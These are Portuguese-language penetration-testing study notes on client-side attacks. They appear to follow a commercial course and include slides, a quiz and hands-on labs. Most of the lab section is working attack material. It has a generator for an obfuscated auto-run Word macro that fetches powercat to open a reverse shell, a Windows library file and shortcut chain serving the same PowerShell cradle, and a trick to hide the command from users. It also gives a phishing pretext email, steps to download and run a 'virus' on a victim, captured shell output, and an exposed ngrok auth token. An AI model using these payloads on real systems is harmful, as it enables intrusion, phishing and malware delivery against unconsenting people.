### **Slide 1: Importância dos Ataques do Lado do Cliente nos Testes de Penetração**

- **Contexto de Testes de Penetração:**  
    Nos testes de penetração, um dos principais desafios é violar o perímetro de segurança das empresas e conseguir uma posição inicial dentro da rede.  
    ➔ **Relatório da Verizon:** Explorar vulnerabilidades técnicas tornou-se cada vez mais difícil. O _Phishing_ agora é o segundo maior vetor de ataque, atrás apenas de ataques de credenciais.
    
- **Funcionamento dos Ataques do Lado do Cliente:**  
    Esses ataques funcionam através da entrega de arquivos maliciosos aos usuários internos.  
    ➔ _Exemplo_: Navegadores, sistemas operacionais e aplicativos de escritório são alvos frequentes.  
    ➔ Para ter sucesso, é necessário persuadir o usuário a executar o arquivo malicioso.
    
- **Aspecto Humano:**  
    ➔ Não basta ter conhecimento técnico avançado; entender psicologia humana, cultura corporativa e normas sociais é essencial.  
    ➔ O ataque não é direcionado apenas a sistemas, mas também às vulnerabilidades humanas, como a falta de atenção ou a confiança excessiva em e-mails e arquivos recebidos.
    

---

### **Slide 2: Planejamento e Execução de Ataques do Lado do Cliente**

- **Reconhecimento como Primeiro Passo:**  
    Antes de escolher o vetor de ataque, é crucial realizar o reconhecimento para entender o ambiente do alvo:  
    ➔ _Sistema Operacional_: Windows, Linux, etc.  
    ➔ _Aplicativos Instalados_: Microsoft Office, navegadores específicos, entre outros.
    
- **Exemplos de Vetores de Ataque:**  
    ➔ _JScript_ malicioso executado pelo Windows Script Host.  
    ➔ Arquivos de atalho _.lnk_ que apontam para recursos maliciosos.  
    ➔ Documentos do Microsoft Office com macros maliciosas embutidas.
    
- **Desafios na Entrega do Payload:**  
    ➔ Filtragem de spam, firewalls e outras tecnologias dificultam a entrega por e-mail.  
    ➔ Alternativas avançadas incluem _USB Dropping_ e ataques _watering hole_.
    
- **Objetivo Final:**  
    Entregar a carga útil para sistemas internos, que muitas vezes não são diretamente acessíveis. Esse tipo de ataque é difícil de mitigar e requer defesas modernas.


### Slide 3: **Aproveitando as Macros do Microsoft Word para Obter um Shell Reverso**

**Título:** Aproveitando as Macros do Microsoft Word para Obter um Shell Reverso

**Conteúdo:**

- **O que são Macros no Microsoft Word?**
    
    - Macros são scripts automatizados criados para realizar tarefas repetitivas no Microsoft Word. Elas são baseadas na linguagem **VBA (Visual Basic for Applications)**.
- **Exploração de Macros Maliciosas:**
    
    - Macros podem ser manipuladas para executar código malicioso, como um **shell reverso**.
    - O atacante cria uma macro VBA dentro de um documento Word, que, ao ser aberta, executa comandos arbitrários.
- **Como Funciona:**
    
    - Ao abrir o documento Word, a macro é executada automaticamente.
    - A macro pode ser configurada para iniciar um **shell reverso** que se conecta ao atacante via rede (usualmente em uma porta específica).
    - O código da macro geralmente executa um comando `mshta` ou `powershell` para baixar e executar um payload malicioso.
- **Exemplo de Código VBA para Shell Reverso:**

    ```vb
    Sub AutoOpen()     
	    Set objShell = CreateObject("WScript.Shell")     
	    objShell.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')" 
	End Sub
    ```

- **Defesas Contra Exploração de Macros:**
    
    - Desabilitar macros em documentos de fontes desconhecidas.
    - Utilizar antivírus e sistemas de proteção que detectam comportamento anômalo.
    - Configurar o Word para bloquear macros por padrão e permitir apenas macros assinadas.

## Slide 4 
Os arquivos de biblioteca do Windows (**.library-ms**) são arquivos XML especiais que definem **bibliotecas** no Windows Explorer. Eles foram introduzidos no Windows 7 e são usados para **agrupar pastas** de diferentes locais em um único "espaço" virtual, facilitando o acesso a arquivos relacionados, mesmo que estejam armazenados em locais diferentes.

### Estrutura dos Arquivos `.library-ms`

Esses arquivos são compostos por várias seções em XML que definem como a biblioteca deve se comportar:

1. **Namespace e versão**: Define a compatibilidade com o sistema operacional.
2. **Nome da biblioteca**: Especifica o nome exibido no Windows Explorer.
3. **Localizações da biblioteca**: Lista os caminhos locais ou remotos que a biblioteca irá acessar.
4. **Ícone**: Define o ícone que será exibido para o arquivo da biblioteca.
5. **Opções adicionais**: Como fixar a biblioteca no painel de navegação ou especificar tipos de conteúdo (documentos, imagens, etc.).

### Exemplo de Uso Legítimo

Um arquivo `.library-ms` pode agrupar pastas de documentos locais e de rede em uma única biblioteca chamada "Documentos". Assim, o usuário acessa todos os documentos em um único lugar, mesmo que estejam espalhados em diferentes locais.

### Exploração em Ataques

Por serem arquivos de configuração XML que podem apontar para **recursos remotos** (como compartilhamentos WebDAV), arquivos `.library-ms` podem ser usados por atacantes para:

- **Enganar vítimas** para acessar locais remotos controlados pelo atacante.
- Disfarçar locais maliciosos como diretórios legítimos.
- **Incorporar payloads** em ataques de engenharia social, onde a vítima é levada a abrir o arquivo acreditando que é inofensivo.

Essa capacidade de apontar para recursos remotos é a base para usá-los como parte de um ataque de execução de código remoto.

# quiz

### Quiz: Ataques do Lado do Cliente e Arquivos `.library-ms`

#### 1. **De acordo com o relatório da Verizon, qual é o segundo maior vetor de ataque em testes de penetração?**

A) Phishing 
B) Exploração de vulnerabilidades técnicas  
C) Uso de senhas fracas  
D) Ataques de força bruta

---

#### 2. **Qual dos seguintes exemplos é um vetor de ataque usado em ataques do lado do cliente?**

A) Ataques de DDoS  
B) Arquivos de atalho (.lnk) maliciosos  
C) Injeção SQL  
D) Spoofing de endereço IP

---

#### 3. **Qual é o objetivo principal de um ataque do lado do cliente?**

A) Comprometer um servidor público exposto à internet  
B) Obter acesso inicial a sistemas internos da rede alvo  
C) Interromper a comunicação entre dispositivos da rede  
D) Roubar credenciais diretamente do banco de dados

---

#### 4. **Como os arquivos `.library-ms` podem ser explorados em ataques?**

A) Para desativar firewalls de rede  
B) Para infectar navegadores com vírus  
C) Para apontar usuários para recursos remotos controlados por atacantes  
D) Para criar atalhos para arquivos infectados em discos locais

---

#### 5. **Qual linguagem de programação é usada para criar macros no Microsoft Word que podem executar um shell reverso?**

A) Python  
B) VBA (Visual Basic for Applications)  
C) PowerShell  
D) C#

---

#### Gabarito:

1. A) Phishing
2. B) Arquivos de atalho (.lnk) maliciosos
3. B) Obter acesso inicial a sistemas internos da rede alvo
4. C) Para apontar usuários para recursos remotos controlados por atacantes
5. B) VBA (Visual Basic for Applications)

# hands-on

## dicas de comandos do terminal do kali
1. Criar nova aba `Ctrl + Shift + T`
2. Alternar entre as abas `Ctrl + Shift + Tab`
3. Dividir o terminal no meio vertical `Ctrl + Shift + D`
4. Dividir o terminal no meio horizontal `Ctrl + Shift + R`
5. Renomear sessão `Alt + Shift + s`
---

## lab 1: Download **old.pdf** from the _Mountain Vegetables_ website on VM #1 by clicking on the **OLD** button. Use _exiftool_ to review the file's metadata. Enter the value of the _Author_ tag.

```shell
# Baixar o arquivo encontrado
wget http://<URL_DO_SERVIDOR>/old.pdf

# Extrair metadados do PDF
exiftool old.pdf
```
---

## lab 2: Start VM and use _gobuster_ to bruteforce the contents of the web server. Specify "pdf" as the filetype and find a document other than **old.pdf** and **brochure.pdf**. After you identify the file, download it and extract the flag in the metadata.


```shell
# Usar Gobuster para encontrar PDFs
gobuster dir -u http://<URL_DO_SERVIDOR> -w /usr/share/wordlists/dirb/common.txt -x pdf

# Baixar o arquivo encontrado
wget http://<URL_DO_SERVIDOR>/info.pdf

# Extrair metadados do PDF
exiftool info.pdf
```

![[Pasted image 20241205163716.png]]

---

## Simples ataque de phishing com geradores de links online
1. abra o link para gerar um novo token
```url
https://canarytokens.orb/nest/generate
```

![[Pasted image 20241205165619.png]]
2. Criando um fake email
```
https://temp-mail.org
```
![[Pasted image 20241205165854.png]]

---
## Enumerando softwares instalados 
Se o host tiver o protocolo SNMP habilitado, você pode usá-lo para coletar informações sobre o software instalado.
```
sudo nmap -sU -p 161 --script snmp-win32-software 192.168.219.196
```

---

## Macros Word
1. Primeira mente crie documento word habilitado com macro.
2. Gere o script VBA para inserir dentro da macro, deve ser digitado o ip e porta (4444) da máquina que vai realizar o ataque do shell reverse com o ncat

```python
import base64


def convert_to_base64_utf16le(input_string):
    utf16le_bytes = input_string.encode('utf-16le')
    base64_bytes = base64.b64encode(utf16le_bytes)
    base64_string = base64_bytes.decode('utf-8')
    return base64_string


def prepare_vba_script(cmd_encoded_to_base64):
    full_script = """
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    {}
    CreateObject("Wscript.Shell").Run Str
End Sub
"""
    str_full = f"powershell.exe -nop -w hidden -e {cmd_encoded_to_base64.strip()}"
    str = f"powershell.exe -nop -w hidden -e {cmd_encoded_to_base64.strip()}"

    n = 50

    for i in range(0, len(str), n):
        str = str + "\n    Str = Str + " + '"' + str[i:i+n].strip() + '"'

    return full_script.format(str.replace(str_full, ''))


def main():
    ip = input("Enter the attacker's ip off attackant host: ")
    ncat_port = input("Enter with the ncat port used to create reverse shell: ")
    cmd = f"IEX(New-Object System.Net.WebClient).DownloadString('http://{ip}/powercat.ps1');powercat -c {ip} -p {ncat_port} -e powershell"
    print("command to encode to base64:", cmd)
    cmd = convert_to_base64_utf16le(cmd)
    print("command encoded to base64:", cmd)
    script = prepare_vba_script(cmd)
    print("========== VBA Script ==========") 
    print(script)


main()
```

3. Prepare a máquina atacante para o shell reverse, entre no seguinte diretório no kali linux

```shell
cd /usr/share/powershell-empire/empire/server/data/module_source/management
```

4. Use o comando do python para subir um servidor neste diretório

```shell
python3 -m http.server 80
```

5. Abra outra aba no terminal com `Ctrl + Shift + t` e rode o comando para ficar escutando na porta 4444 no ncat 

```shell
nc -nvlp 4444
```

6. Agora abra o arquivo com a Marco no computador alvo e o shell reverse deve ocorrer

7. zoando o usuário
```shell
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("Perdeu seu otario !!! voce foi invadido e violado com sucesso !!!!!!!!!")
```

8. abrindo vários processos
```shell
for ($i = 1; $i -le 10; $i++) {
    Start-Process "calc.exe"
}
```

9. Download de virus

-   Copia o programa para onde o servidor do python esta ativo

```shell
sudo cp programa.exe /usr/share/powershell-empire/empire/server/data/module_source/management/
```

- Faça o download do virus na máquina da vítima

```shell
Invoke-WebRequest -Uri "http://192.168.0.102/programa.exe" -OutFile "programa.exe"
```

- agora execute !

```shell
Start-Process ".\programa.exe"
```


10. janela mais elaborada

```shell
Add-Type -AssemblyName System.Windows.Forms

$form = New-Object Windows.Forms.Form
$form.Text = "Entrada de Dados"
$form.Size = New-Object Drawing.Size(300,200)

$label = New-Object Windows.Forms.Label
$label.Text = "Digite algo:"
$label.Location = New-Object Drawing.Point(10,20)
$form.Controls.Add($label)

$textBox = New-Object Windows.Forms.TextBox
$textBox.Location = New-Object Drawing.Point(10,50)
$textBox.Size = New-Object Drawing.Size(260,20)
$form.Controls.Add($textBox)

$okButton = New-Object Windows.Forms.Button
$okButton.Text = "OK"
$okButton.Location = New-Object Drawing.Point(80,100)
$okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
$form.AcceptButton = $okButton
$form.Controls.Add($okButton)

$cancelButton = New-Object Windows.Forms.Button
$cancelButton.Text = "Cancel"
$cancelButton.Location = New-Object Drawing.Point(160,100)
$cancelButton.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
$form.CancelButton = $cancelButton
$form.Controls.Add($cancelButton)

$result = $form.ShowDialog()
if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
    $userInput = $textBox.Text
    [System.Windows.Forms.MessageBox]::Show("Você digitou: $userInput")
} else {
    [System.Windows.Forms.MessageBox]::Show("Operação cancelada.")
}
```

11. Ngrok configuration

```shell
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
sudo mv ngrok /usr/local/bin
ngrok config add-authtoken 2ppbobIZMP3XjWPzlKSXq2IYT8H_6MAwFj736ZPn9CxLzMhjg
```

---

## Biblioteca do windows explorer

Os arquivos de biblioteca do Windows são contêineres virtuais para conteúdo do usuário. Eles conectam usuários com dados armazenados em locais remotos, como serviços da Web ou compartilhamentos. Esses arquivos têm uma extensão de arquivo **.Library-ms** e podem ser executados clicando duas vezes neles no Windows Explorer.

Nesta seção, usaremos um ataque do lado do cliente em dois estágios. No primeiro estágio, usaremos arquivos de biblioteca do Windows para ganhar uma posição no sistema de destino e configurar o segundo estágio. No segundo estágio, usaremos a posição para fornecer um arquivo executável que iniciará um shell reverso quando clicado duas vezes.

Primeiro, criaremos um arquivo de biblioteca do Windows conectando-se a um compartilhamento _WebDAV_ [1](https://portal.offsec.com/courses/pen-200-44065/learning/client-side-attacks-48976/abusing-windows-library-files-49009/obtaining-code-execution-via-windows-library-files-48979#fn-local_id_811-1) que configuraremos. No primeiro estágio, a vítima recebe um arquivo **.Library-ms** , talvez por e-mail. Quando eles clicam duas vezes no arquivo, ele aparecerá como um diretório regular no Windows Explorer. No diretório WebDAV, forneceremos uma carga útil na forma de um arquivo de atalho **.lnk** para o segundo estágio para executar um shell reverso do PowerShell. Precisamos convencer o usuário a clicar duas vezes em nosso arquivo de carga útil **.lnk** para executá-lo.

À primeira vista, pode parecer que poderíamos fazer isso servindo o arquivo **.lnk** para o segundo estágio com um servidor web como o Apache. A desvantagem é que precisaríamos fornecer nosso link da web para a vítima (novamente, talvez por e-mail). A maioria dos filtros de spam e tecnologias de segurança analisam o conteúdo de um link para conteúdo suspeito ou tipos de arquivo executável para download. Isso significa que nossos links podem ser filtrados antes mesmo de chegar à vítima.


```shell
# setup
sudo apt install python3-wsgidav
mkdir ms-library
touch ./ms-library/test.txt
chmod 777 ms-library

# run
wsgidav --port=80 --host=0.0.0.0 --root=./ms-library --auth=anonymous
```



A saída indica que o servidor WebDAV agora está sendo executado na porta 80. Vamos confirmar isso abrindo **http://127.0.0.1** em nosso navegador.

![Figura 25: Conteúdo do compartilhamento WebDAV](https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/5377fb2c3624ec7bfb55d60f8196895a-csa_sc_webdavbrowser2.png)


**Criando a biblioteca**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.0.102</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```



**Usaremos o comando que utilizamos anteriormente:**

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.0.102:8000/powercat.ps1');powercat -c 192.168.0.102 -p 4444 -e powershell"
```

> Listagem 18 - PowerShell Download Cradle e PowerCat Reverse Shell Execution

Vamos inserir este comando no campo de entrada e clicar em _Avançar_ .

![Figura 28: Criando um atalho no CLIENT137](https://static.offsec.com/offsec-courses/PEN-200/imgs/clientsideattacks/2ad68e3a33e8ba87b2a27876c2bbf6f5-csa_sc_createshortcut2.png)

Figura 28: Criando um atalho no CLIENT137

Se esperamos que nossas vítimas sejam experientes em tecnologia o suficiente para realmente verificar para onde os arquivos de atalho estão apontando, podemos usar um truque útil. Como nosso comando fornecido parece muito suspeito, poderíamos simplesmente colocar um delimitador e um comando benigno atrás dele para empurrar o comando malicioso para fora da área visível no menu de propriedades do arquivo. Se um usuário verificasse o atalho, ele veria apenas o comando benigno.

Na próxima janela, vamos inserir **automatic_configuration** como o nome do arquivo de atalho e clicar em _Concluir_ para criar o arquivo.

Em nossa máquina Kali, vamos iniciar um servidor web Python3 na porta 8000, onde **powercat.ps1** está localizado, e iniciar um ouvinte Netcat na porta 4444.

Em vez de usar um servidor web Python3 para servir o Powercat, também poderíamos hospedá-lo no compartilhamento WebDAV. No entanto, como nosso compartilhamento WebDAV é gravável, o AV e outras soluções de segurança poderiam remover ou colocar em quarentena nossa carga útil. Se configurarmos o compartilhamento WebDAV como somente leitura, perderemos um ótimo método de transferência de arquivos de sistemas de destino. Ao longo deste curso, usaremos um servidor web Python3 para servir nossa carga útil para ataques utilizando arquivos da Biblioteca do Windows.

Para confirmar que o download cradle e o shell reverso do PowerCat funcionam, vamos clicar duas vezes no arquivo de atalho na área de trabalho. Após confirmar que queremos executar o aplicativo na janela que aparece, o Netcat listener deve receber um shell reverso.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.194] 49768
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0>
```

> Listagem 19 - Conexão de shell reversa bem-sucedida por meio do nosso arquivo de atalho

Para concluir esta seção, vamos obter um shell reverso da máquina _HR137 em_ **192.168.50.195** . Para este exemplo, forneceremos o arquivo de biblioteca do Windows que criamos para uma vítima simulada com um pretexto. Nosso objetivo é convencer a vítima a clicar duas vezes no atalho após incorporar o compartilhamento WebDAV por meio do arquivo de biblioteca do Windows preparado.

O pretexto é um aspecto importante desse ataque do lado do cliente. Nesse caso, poderíamos dizer ao alvo que somos um novo membro da equipe de TI e precisamos configurar todos os sistemas do cliente para a nova plataforma de gerenciamento. Também diremos a eles que incluímos um programa de configuração amigável. Um exemplo de e-mail para uso em uma avaliação real é mostrado abaixo.

```
Hello! My name is Dwight, and I'm a new member of the IT Team. 

This week I am completing some configurations we rolled out last week.
To make this easier, I've attached a file that will automatically
perform each step. Could you download the attachment, open the
directory, and double-click "automatic_configuration"? Once you
confirm the configuration in the window that appears, you're all done!

If you have any questions, or run into any problems, please let me
know!
```

> Listagem 20 - Exemplo de conteúdo de e-mail

Agora, vamos copiar **automatic_configuration.lnk** e **config.Library-ms** para nosso diretório WebDAV em nossa máquina Kali. Por conveniência, podemos usar o arquivo de biblioteca **config** para copiar os arquivos para o diretório. Em uma avaliação normal, provavelmente enviaríamos o arquivo de biblioteca por e-mail, mas para este exemplo, usaremos o compartilhamento SMB **\\192.168.50.195\share** para simular a etapa de entrega.

Em seguida, iniciaremos o servidor web Python3 na porta 8000 para servir **powercat.ps1** , WsgiDAV para nosso compartilhamento WebDAV **/home/kali/webdav** e um ouvinte Netcat na porta 4444.

Para carregar o arquivo de biblioteca para o compartilhamento SMB, usaremos **smbclient** [25](https://portal.offsec.com/courses/pen-200-44065/learning/client-side-attacks-48976/abusing-windows-library-files-49009/obtaining-code-execution-via-windows-library-files-48979#fn-local_id_811-25) com o parâmetro **-c** para especificar o comando **put config.Library-ms . Antes de executarmos smbclient, precisamos alterar nosso diretório atual para o diretório do arquivo de biblioteca. Também excluiremos o arquivo** **test.txt** criado anteriormente do compartilhamento WebDAV.

```
kali@kali:~$ cd webdav

kali@kali:~/webdav$ cd webdav

kali@kali:~/webdav$ rm test.txt

kali@kali:~/webdav$ smbclient //192.168.50.195/share -c 'put config.Library-ms'
Enter WORKGROUP\kali's password: 
putting file config.Library-ms as \config.Library-ms (1.8 kb/s) (average 1.8 kb/s)
```

> Listagem 21 - Carregando nosso arquivo de biblioteca para o compartilhamento SMB na máquina HR137

Depois de colocarmos o arquivo de biblioteca na máquina de destino via smbclient, um usuário simulado no sistema o abre e inicia o shell reverso executando o arquivo de atalho.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.195] 56839
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
whoami
hr137\hsmith
```

> Listagem 22 - Shell reverso de entrada do HR137

A Listagem 22 mostra que recebemos com sucesso um shell reverso com nossos arquivos de biblioteca e atalho.

Excelente.

Também poderíamos ter combinado essa técnica com nosso ataque de macro anterior do Office ou qualquer outro tipo de ataque do lado do cliente.

Nesta seção, aprendemos sobre os arquivos da Biblioteca do Windows e como transformá-los em uma arma como um primeiro estágio eficaz para entregar um arquivo executável em ataques do lado do cliente. Como segundo estágio, usamos um arquivo de atalho para baixar o PowerCat e iniciar um shell reverso. Os arquivos da Biblioteca do Windows são uma ótima maneira de entregar nossas cargas úteis de segundo estágio sem expô-las a tecnologias de segurança, como filtros de spam.